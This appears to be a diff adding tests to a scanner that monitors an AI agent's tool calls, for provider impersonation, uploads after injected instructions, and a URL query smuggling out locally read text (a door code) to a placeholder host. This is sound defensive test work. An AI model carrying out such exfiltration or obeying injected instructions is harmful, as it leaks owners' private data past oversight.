@@ -363,3 +363,140 @@ def test_no_file_hint_for_a_call_that_sends_off_the_host(twin_case, params):
     """A file grant sanctions access, never sending the file off the host."""
     _, res = _scan(_send_case(twin_case), params)
     assert all(h.kind != "file" for h in res.response.grant_hints)
+
+
+# ---- what the owner could not tell apart from an attack -------------------------------------------------------
+
+PROVIDER = {
+    "kind": "mcp",
+    "name": "relay",
+    "identity": "npm:@example/relay-mcp@0.1.0",
+    "transport": "stdio",
+}
+
+
+def _mcp_case(twin_case, *, scheduled: bool = False) -> dict:
+    """The owner asks for a digest to go through a tool from an MCP server the library does not know."""
+    case = _send_case(twin_case)
+    fx = case["fixture"]
+    fx["request"]["text"] = "Post the digest through relay."
+    fx["pending_call"].update(
+        {
+            "tool": "post_digest",
+            "tool_kind": "mcp",
+            "provider": PROVIDER,
+            "arguments": {"channel": "desk", "text": "Build is green."},
+        }
+    )
+    if scheduled:
+        fx["trigger"] = {
+            "kind": "scheduled",
+            "channel": None,
+            "sender": {"relation": "unknown", "basis": ["none"]},
+        }
+    return case
+
+
+def _history_call(tool, tool_kind, provider, arguments) -> dict:
+    return {
+        "step": 1,
+        "turn": 1,
+        "call_id": "call_1",
+        "tool": tool,
+        "tool_kind": tool_kind,
+        "provider": provider,
+        "arguments": arguments,
+        "result": {"status": "ok", "size_bytes": 40},
+        "action_fingerprint": "afp1:x",
+        "risk": 3,
+        "tiers": {"suspicion": 0.05, "consequence": 0.1, "confidence": 0.9},
+        "request_id": "00000000-0000-4000-8000-0000000000a0",
+        "decision": "allowed",
+    }
+
+
+@SETS
+def test_a_provider_hint_only_where_the_owner_attends(twin_case, params):
+    """A provider grant trusts code that runs inside the agent: suggested when the owner asked for the work in
+    their own chat, never from a scheduled run."""
+    _, attended = _scan(_mcp_case(twin_case), params)
+    assert [(h.kind, h.pattern) for h in attended.response.grant_hints] == [
+        ("provider", PROVIDER["identity"])
+    ]
+    _, scheduled = _scan(_mcp_case(twin_case, scheduled=True), params)
+    assert scheduled.response.risk >= REVIEW_LINE and scheduled.response.grant_hints == []
+
+
+@SETS
+def test_no_hint_for_a_provider_the_session_switched_a_tool_to(twin_case, params):
+    """The same tool name came from another server earlier in the session: the new one may be impersonating it."""
+    case = _mcp_case(twin_case)
+    fx = case["fixture"]
+    fx["session"]["step"] = 2
+    fx["history"] = [
+        _history_call(
+            "post_digest",
+            "mcp",
+            {**PROVIDER, "name": "desk", "identity": "npm:@example/desk-mcp@2.0.0"},
+            {"channel": "desk", "text": "hi"},
+        )
+    ]
+    _, res = _scan(case, params)
+    r = res.response
+    assert "origin.switched_provider" in {x.code for x in r.reasons}
+    assert r.risk >= REVIEW_LINE and r.grant_hints == []
+
+
+@SETS
+def test_no_hint_for_uploading_a_file_in_a_tainted_session(twin_case, params):
+    """The session read content that tried to instruct the agent: a file going to a new host is what that
+    instruction looks like, so no grant is suggested for it. A plain message to the same host still is."""
+    upload = _send_case(twin_case)
+    upload["state_seed"]["tainted"] = True
+    _, res = _scan(upload, params)
+    assert res.response.risk >= REVIEW_LINE and res.response.grant_hints == []
+    text = _send_case(
+        twin_case, command=f"curl -X POST https://{HOST}/v1/notes -d 'build is green'"
+    )
+    text["state_seed"]["tainted"] = True
+    _, res = _scan(text, params)
+    assert [h.pattern for h in res.response.grant_hints] == [HOST]
+
+
+@SETS
+def test_no_hint_for_a_fetch_whose_address_carries_a_local_read(twin_case, params):
+    """Text the session read from a local file, put into a URL's query: data leaving in an address."""
+    case = _send_case(twin_case)
+    fx = case["fixture"]
+    fx["session"]["step"] = 2
+    fx["request"]["text"] = "Look up the kiln hours for 2026-10-15."
+    host = {"kind": "host", "name": None, "identity": None, "transport": None}
+    fx["history"] = [
+        _history_call("read", "file_read", host, {"path": "/home/me/workspace/notes/kiln.md"})
+    ]
+    fx["new_inputs"] = [
+        {
+            "input_seq": 1,
+            "kind": "tool_result",
+            "call_id": "call_1",
+            "tool": "read",
+            "tool_kind": "file_read",
+            "provider": host,
+            "status": "ok",
+            "content_type": "text",
+            "content": "gate latch sticks, code for the side door is on the fridge",
+            "size_bytes": 58,
+            "truncated": False,
+        }
+    ]
+    query = "note=gate%20latch%20sticks%2C%20code%20for%20the%20side%20door"
+    fx["pending_call"].update(
+        {
+            "tool": "web_fetch",
+            "tool_kind": "web_fetch",
+            "arguments": {"url": f"https://{HOST}/kiln?d=2026-10-15&{query}"},
+        }
+    )
+    _, res = _scan(case, params)
+    assert res.prepared.url_carries
+    assert res.response.risk >= REVIEW_LINE and res.response.grant_hints == []
